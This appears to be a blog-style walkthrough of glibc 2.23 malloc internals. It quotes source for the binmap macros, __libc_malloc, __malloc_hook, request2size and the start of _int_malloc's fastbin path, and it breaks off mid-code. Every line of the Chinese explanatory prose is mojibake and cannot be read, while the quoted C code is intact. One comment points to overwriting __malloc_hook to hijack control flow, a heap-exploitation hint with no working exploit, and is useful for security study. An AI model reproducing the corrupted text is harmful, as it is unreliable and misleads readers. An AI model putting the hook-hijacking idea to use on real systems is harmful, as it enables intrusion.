<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br></pre></td></tr></table></figure>

<p>è®¡ç®—iä¸‹æ ‡çš„largebinsæ¡¶å­å±äºå…¶å¯¹åº”blockçš„å“ªä¸€ä½ç®¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))			//æ”¹,æ ‡è®°iä¸‹æ ‡çš„largebinsæœ‰ç©ºé—²å †å—</span><br><span class="line">#define unmark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))		//åˆ </span><br><span class="line">#define get_binmap(m, i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))			//æŸ¥</span><br></pre></td></tr></table></figure>













<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>ç”¨æˆ·ç©ºé—´çš„mallocå‡½æ•°,å®é™…ä¸Šè°ƒç”¨çš„æ˜¯<code>__libc_malloc@glibc</code>,åˆ«åç½¢äº†</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>ç”¨æˆ·ç¨‹åºè°ƒç”¨çš„mallocå‡½æ•°,å®é™…ä¸Šè°ƒç”¨çš„æ˜¯<code>__libc_malloc</code></p>
<p>åœ¨<code>glibc/malloc/malloc.c</code>ä¸­æœ‰è¿™ä¹ˆä¸€ä¸ª<code>alias</code>å£°æ˜</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>__libc_malloc</code>å®é™…ä¸Šåšçš„äº‹æƒ…å°±ä¸¤å¥è¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–å†…å®¹éƒ½æ˜¯å¤šçº¿ç¨‹ä¸Šä¸‹é”,å„ç§æ£€æŸ¥,ç¼–è¯‘ä¼˜åŒ–äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;<span class="comment">//å †å—æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));<span class="comment">//åœ¨å®é™…è°ƒç”¨int_mallocå‡½æ•°ä¹‹å‰,é¦–å…ˆè°ƒç”¨é’©å­å‡½æ•°hook,hookæŒ‡å‘__malloc_hook</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);<span class="comment">//è·å–åˆ†é…åŒºæŒ‡é’ˆ,è¿”å›å€¼äº¤ç»™ar_ptr,ä¼ é€’å‚æ•°bytesçš„ä½œç”¨æ˜¯åˆ¤æ–­åˆ†é…åŒºç©ºé—´æ˜¯å¦è¶³å¤Ÿ</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//int_mallocå‡½æ•°æ˜¯å®é™…è¿›è¡Œå†…å­˜åˆ†é…çš„å‡½æ•°</span></span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)<span class="comment">//åˆ†é…å¤±è´¥å¹¶ä¸”æ²¡æœ‰è·å–åˆ°åˆ†é…åŒº</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);<span class="comment">//åˆ†é…åŒºè·å–å¤±è´¥,é‡è¯•ä¸€æ¬¡</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);<span class="comment">//é‡æ–°è·å–åˆ†é…åŒºä¹‹åå†æ¬¡å°è¯•åˆ‡å‰²å †å—ç»™victim</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)<span class="comment">//è§£é”,å› ä¸ºint_mallocä¸­ä¼šå¯¹åˆ†é…åŒºä¸Šé”,è§£é”åæ–¹ä¾¿å…¶ä»–çº¿ç¨‹åˆ†é…å†…å­˜</span></span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));<span class="comment">//æœ€åä¸€æ¬¡æ£€æŸ¥</span></span><br><span class="line">    <span class="comment">//æ£€æŸ¥å†…å®¹åŒ…æ‹¬:</span></span><br><span class="line">        <span class="comment">//victimæŒ‡é’ˆæ˜¯å¦çœŸçš„æŒ‡å‘ä¸€ä¸ªå †å—</span></span><br><span class="line">        <span class="comment">//victimå¯¹åº”çš„å †å—æ˜¯å¦å·²ç»åœ¨bitmapä¸­è¢«æ ‡è®°</span></span><br><span class="line">        <span class="comment">//ar_ptræŒ‡å‘çš„åˆ†é…åŒº,æ˜¯å¦æ˜¯victimå †å—æ‰€åœ¨çš„åˆ†é…åŒº</span></span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="atomic-forced-read"><a href="#atomic-forced-read" class="headerlink" title="atomic_forced_read"></a>atomic_forced_read</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> atomic_forced_read(x) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (x) __x; __asm (<span class="string">&quot;&quot;</span> : <span class="string">&quot;=r&quot;</span> (__x) : <span class="string">&quot;0&quot;</span> (x)); __x; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>åŸå­è¯»,è¿™æ®µå†…è”æ±‡ç¼–åº”è¯¥è¿™æ ·æ–­å¥:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm (</span><br><span class="line"> 	&quot;&quot; </span><br><span class="line"> 	: &quot;=r&quot; (__x) </span><br><span class="line"> 	: &quot;0&quot; (x)</span><br><span class="line"> ); </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆâ€â€æ„æ€æ˜¯æ²¡æœ‰ä¸€æ¡æŒ‡ä»¤,æœ¬å†…è”ä»£ç å—åªéœ€è¦ä½¿ç”¨è¾“å…¥è¾“å‡ºçº¦æŸ</p>
<p><code>&quot;=r&quot; (__x) </code>è¾“å‡ºæ“ä½œæ•°çº¦æŸ,æ„æ€æ˜¯å°†<code>__x</code>è§†ä¸ºè¾“å‡ºå˜é‡,æ”¾åˆ°é€šç”¨å¯„å­˜å™¨é‡Œ</p>
<p><code>: &quot;0&quot; (x)</code>è¾“å…¥æ“ä½œæ•°çº¦æŸ,æ„æ€æ˜¯xä½¿ç”¨å’Œç¬¬ä¸€ä¸ªè¾“å‡ºæ“ä½œæ•°(ä¹Ÿå°±æ˜¯<code>__x</code>)ç›¸åŒçš„çº¦æŸ</p>
<p>æ•´ä¸ªå†…è”æ±‡ç¼–çš„ä½œç”¨æ˜¯å°†å˜é‡xæ‹·è´åˆ°<code>__x</code>ä¸­</p>
<p>çœ‹å®Œäº†ä¹Ÿä¸çŸ¥é“â€åŸå­â€å¦‚ä½•ä¿è¯çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å™¨åˆ†æ”¯é¢„æµ‹ä¼˜åŒ–</p>
<p><code>long __builtin_expect(long exp, long c);</code>æœŸæœ›expè¡¨è¾¾å¼çš„å€¼ç­‰äºc</p>
<h5 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void *malloc_hook_ini(size_t sz,const void *caller) __THROW;</span><br><span class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</span><br></pre></td></tr></table></figure>

<p>åˆ†é…å‰é’©å­,å¦‚æœæœ‰æ³¨å†Œé’©å­å‡½æ•°,åˆ™è°ƒç”¨è¯¥é’©å­å‡½æ•°è¿›è¡Œåˆ†é…,ç›´æ¥è¿”å›é’©å­å‡½æ•°çš„è¿”å›å€¼ç»™å¥æŸ„,ä¸ä¼šå†è°ƒç”¨glibcè‡ªå·±å®ç°çš„int_malloc</p>
<p>å¯ä»¥è€ƒè™‘ç¯¡æ”¹malloc_hooké’©å­åŠ«æŒæ§åˆ¶æµ</p>
<p><a target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hookä»¥åŠfree_hookåŠ«æŒåŸç† | S3canaâ€™s Blog (seanachao.github.io)</a></p>
<h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><p>è¿™ä¸ªå‡½æ•°å¾ˆé•¿,å› ä¸ºGNUå‘æ¥è¦æ±‚å‡½æ•°åµŒå¥—ä¸èƒ½å¤ªæ·±,å› æ­¤è¿™ä¸ªä¸€ä¸ªå‡½æ•°ç»¼åˆäº†ä»fastbin,smallbin,bin,unsortedbinç­‰å„ç§åœ°æ–¹ç”³è¯·å †å—çš„æ“ä½œ</p>
<p>glibc2.23&#x2F;malloc&#x2F;malloc.c ç¬¬3318è¡Œå¼€å§‹</p>
<p>å‡½æ•°ç­¾å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static void *_int_malloc (mstate av, size_t bytes);</span><br></pre></td></tr></table></figure>

<p>staticå†³å®šæœ¬å‡½æ•°åªèƒ½åœ¨mallocæ¨¡å—ä¸­å¯è§,ç”¨æˆ·ç¨‹åºæ— æ³•è¶Šçº§è°ƒç”¨</p>
<p>void*è¿”å›å€¼ç±»å‹</p>
<p>ä¸¤ä¸ªå‚æ•°,<code>mstate av</code>æ˜¯åˆ†é…åŒºæŒ‡é’ˆ</p>
<p><code>size_t bytes</code>æ˜¯ä¼å›¾åˆ†é…çš„å†…å­˜å¤§å°</p>
<h4 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/malloc.png" alt="malloc"></p>
<h4 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h4><p>é¦–å…ˆå®šä¹‰äº†ä¸€ä¼—å±€éƒ¨å˜é‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span><span class="comment">//æœ¬å˜é‡æ˜¯ç”¨æˆ·å¸Œæœ›å¤§å°sizeçš„è®¡ç®—å€¼,ä¹Ÿå°±æ˜¯å®é™…çš„å †å—å¤§å°</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span><span class="comment">//æœ¬å˜é‡ç”¨äºè®°å½•nbå¤§å°çš„å †å—å±äºçš„æ¡¶å­ä¸‹æ ‡</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span>;<span class="comment">//æ¡¶å­å¤´æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span><span class="comment">//å‘½ä¸­å †å—</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span>	<span class="comment">//victimå‘½ä¸­å †å—æœ¬æ¥çš„å¤§å°</span></span><br><span class="line"><span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span>	<span class="comment">//victim_indexå‘½ä¸­å †å—å±äºçš„æ¡¶å­ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span>	<span class="comment">//åˆ‡å‰²ä¸€ä¸ªå¤§å—,å‰©ä¸‹çš„éƒ¨åˆ†è¢«ç§°ä¸ºremainder</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span>	<span class="comment">//å‰©ä½™éƒ¨åˆ†çš„å¤§å°</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span>	<span class="comment">//binmapä¸‹æ ‡,ç”¨äºè®°å½•ä¸€ä¸ªæ¡¶å­å±äºå››ä¸ªblockä¹‹ä¸€çš„å“ªä¸€ä¸ª</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span>		<span class="comment">//ç”¨äºè®°å½•ä¸€å…±æ¡¶å­å±äºå…¶blockä¸­çš„å“ªä¸€ä½	</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span>	<span class="comment">//binmap[map],ä½œä¸ºbinmapçš„ä¸‹æ ‡,æœ‰0,1,2,3å››ä¸ªå–å€¼</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span>		<span class="comment">//å–æ¡¶å­å¤´ä¹‹åä¸€èˆ¬ä¼šè®©bckæŒ‡å‘ä¹‹å‰çš„ç¬¬ä¸€ä¸ªå †å—,fwdæŒ‡å‘æ¡¶å­å¤´,ç„¶åå¤´æ’</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="è®¡ç®—å®é™…å¤§å°"><a href="#è®¡ç®—å®é™…å¤§å°" class="headerlink" title="è®¡ç®—å®é™…å¤§å°"></a>è®¡ç®—å®é™…å¤§å°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checked_request2size (bytes, nb);</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå®çš„ä½œç”¨æ˜¯å°†è¯·æ±‚çš„bytes,æŒ‰ç…§å¯¹é½ç­‰è§„åˆ™,è½¬åŒ–ä¸ºå®é™…ä¸Šè¦ç”³è¯·çš„å¤§å°nb</p>
<p>ç»è¿‡æ­¤å®ä¹‹å,int_mallocä¸­ä½¿ç”¨çš„éƒ½æ˜¯nb,ä¸å†ä½¿ç”¨bytesä½œä¸ºåˆ†é…å¤§å°</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#define checked_request2size(req, sz)                             \</span><br><span class="line">  if (REQUEST_OUT_OF_RANGE (req)) &#123;					      \</span><br><span class="line">      __set_errno (ENOMEM);						      \</span><br><span class="line">      return 0;								      \</span><br><span class="line">    &#125;									      \</span><br><span class="line">  (sz) = request2size (req);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line">  #  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¯·æ±‚å¤§å°req+SIZE_SZ+å¯¹é½æ©ç å°äºæœ€å°åˆ†é…å¤§å°,åˆ™æŒ‰ç…§æœ€å°åˆ†é…å¤§å°æ¥</p>
<p>å¦åˆ™å°†ä¸Šè¿°å€¼å’Œå¯¹é½æ©ç çš„è¡¥ç æŒ‰ä½ä¸</p>
<p>åœ¨x64ä¸Š</p>
<p>MALLOC_ALIGNMENT&#x3D;2*SIZE_SZ&#x3D;16</p>
<p>MALLOC_ALIGN_MASK&#x3D;15</p>
<p>request2size(req) &#x3D;(req+8+15 )&amp;11111110000</p>
<p>å‡è®¾req&#x3D;0x10,å³ç”¨æˆ·å¸Œæœ›å¾—åˆ°ä¸€å—è‡³å°‘æœ‰0x10ä¸ªå­—èŠ‚çš„å †å—åˆ™</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request2size(req) </span><br><span class="line">    =(<span class="number">16</span>+<span class="number">8</span>+<span class="number">15</span> )&amp;<span class="number">11111110000</span></span><br><span class="line">    =(<span class="number">0b10000</span>+<span class="number">0b1000</span>+<span class="number">0b1111</span>)&amp;<span class="number">111111110000</span></span><br><span class="line">    =<span class="number">0b100111</span>&amp;<span class="number">0b110000</span></span><br><span class="line">    =<span class="number">0b100000</span></span><br><span class="line">    =<span class="number">32</span></span><br></pre></td></tr></table></figure>

</blockquote>
<h4 id="æ£€æŸ¥å½“å‰æ˜¯å¦æœ‰å¯ç”¨åˆ†é…åŒº"><a href="#æ£€æŸ¥å½“å‰æ˜¯å¦æœ‰å¯ç”¨åˆ†é…åŒº" class="headerlink" title="æ£€æŸ¥å½“å‰æ˜¯å¦æœ‰å¯ç”¨åˆ†é…åŒº"></a>æ£€æŸ¥å½“å‰æ˜¯å¦æœ‰å¯ç”¨åˆ†é…åŒº</h4><p>ç„¶åæ£€æŸ¥avåˆ†é…åŒºæŒ‡é’ˆæ˜¯å¦ä¸ºç©º,æ˜¾ç„¶è¿™é‡Œçš„ç¼–è¯‘å™¨ä¼˜åŒ–æ˜¯æœŸæœ›å…¶ä¸ç©ºçš„</p>
<p>ä½†æ˜¯å¦‚æœçœŸçš„avä¸ºç©º,æ²¡æœ‰å¯ç”¨åˆ†é…åŒºçš„ç”»,åˆ™è°ƒç”¨sysmallocç›´æ¥è§£å†³åˆ†é…é—®é¢˜</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœçœŸä¸ºç©ºåˆ™è°ƒç”¨sysmallocå‡½æ•°,</p>
<p>sysmallocè¢«è°ƒç”¨çš„æƒ…å†µæ˜¯è¿™æ ·çš„:</p>
<p>å½“avåˆ†é…åŒºçš„topchunkå¤§å°ä¸è¶³ä»¥æ»¡è¶³ç”¨æˆ·éœ€æ±‚,è°ƒç”¨sysmallocæ‰©å¤§topchunkå¤§å°æˆ–è€…æ›´æ¢topchunk</p>
<p>æ¯”å¦‚è°ƒç”¨sbrkç³»ç»Ÿè°ƒç”¨æ‰©å¤§topchunkçš„å¤§å°</p>
<p>sysmallocå¦‚æœèƒ½æˆåŠŸåˆ†é…å †å—,åˆ™pæŒ‡å‘è¯¥å †å—,ç„¶å<code>alloc_perturb</code>å°†pæŒ‡å‘å †å—çš„ç”¨æˆ·ç©ºé—´çš„å‰bytesä¸ªå­—èŠ‚,åˆå§‹åŒ–ä¸º<code>perturb_byte^0xff</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">alloc_perturb</span> <span class="params">(<span class="type">char</span> *p, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fastbinsåŒºåˆ†é…"><a href="#fastbinsåŒºåˆ†é…" class="headerlink" title="fastbinsåŒºåˆ†é…"></a>fastbinsåŒºåˆ†é…</h4><p>ç»è¿‡ä¸¤ä¸ªæ£€æŸ¥ä¹‹å,å¦‚æœæ§åˆ¶æµæ‰§è¡Œè‡³æ­¤,è¯´æ˜éœ€è¦åˆ†é…çš„å †å—ä¸æ˜¯å¾ˆç¦»è°±,èµ·ç ä¸ç”¨éº»çƒ¦sbrké¢å¤–åˆ†é…å¤§å—å†…å­˜</p>
<p>é‚£ä¹ˆé¦–å…ˆå°è¯•ä½¿ç”¨fastbinsè¿›è¡Œåˆ†é…</p>
<blockquote>
<p>åœ¨è¯¥åŒºåˆ†é…çš„ä¸»è¦æµç¨‹:</p>
<p>1.æ ¹æ®å®é™…å †å—å¤§å°nbè®¡ç®—åº”è¯¥è½åœ¨å“ªä¸ªæ¡¶å­é‡Œ</p>
<p>2.ä»è¯¥æ¡¶å­é¡¶å–å‡ºä¸€ä¸ªå †å—äº¤ç»™ç”¨æˆ·</p>
<p>3.å°†è¯¥æ¡¶å­ä¸­å‰©ä½™çš„éƒ¨åˆ†é‡æ–°æŒ‚åˆ°æ¡¶å­å¤´ä¸Š</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;<span class="comment">//é¦–å…ˆåˆ¤æ–­,nbè¿™ä¸ªå¤§å°,æ˜¯å¦è½åœ¨fastbinsç®¡ç†çš„å †å—å¤§å°èŒƒå›´å†…</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ§åˆ¶æµè‡³æ­¤è¯´æ˜nbå¤§å°é€‚åˆfastbinsåˆ†é…,ä¸‹é¢éœ€è¦åˆ¤æ–­fastbinsé‡Œé¢æœ‰æ²¡æœ‰ç©ºé—²å †å—</span></span><br><span class="line"></span><br><span class="line">    idx = fastbin_index (nb);<span class="comment">//æ ¹æ®nbå¤§å°è®¡ç®—è½åœ¨fastbinçš„å“ªä¸ªæ¡¶é‡Œé¢,è¿”å›å€¼æ˜¯æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//&amp;fastbins[idx]å°±æ˜¯å¯¹åº”æ¡¶çš„æ¡¶å­å¤´</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//*è§£å¼•ç”¨,ä¹Ÿå°±æ˜¯æ‹¿å‡ºfastbins[idx]æŒ‡å‘çš„ç¬¬ä¸€ä¸ªå †å—,ppæ‹·è´å †å—çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;<span class="comment">//å¦‚æœä¸Šæ¥victimå°±ä¸ºç©º,è¯´æ˜æ¡¶å­å¤´fastbins[idx]æŒ‡å‘NULL,ä¹Ÿå°±æ˜¯è¿™ä¸ªæ¡¶æ˜¯ç©ºçš„</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> (</span><br><span class="line">    		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">          )!= victim</span><br><span class="line">        <span class="comment">//victimæŒ‡å‘é“¾æ ˆé¡¶,ç„¶åæŠŠä»–å–ä¸‹æ¥,æŠŠåŸæ¥çš„æ¬¡é¡¶å †å—æŒ‚åˆ°fbæŒ‡é’ˆä¸Š,è¿”å›å€¼ppæ˜¯victim</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)<span class="comment">//å¦‚æœvictimä¸ä¸º0è¯´æ˜å¯¹åº”æ¡¶ä¸­ç¡®å®æœ‰å †å—,å¹¶ä¸”å·²ç»äº¤ç»™victimä¿ç®¡</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;<span class="comment">//victimè·å–åˆ°çš„fastbinå †å—,å†æ£€æŸ¥ä¸€ä¸‹å‘ç°ä¸åº”è¯¥å±äºå…¶åŸæœ¬çš„æ¡¶ä¸­,è¯´æ˜æœ‰é¬¼</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          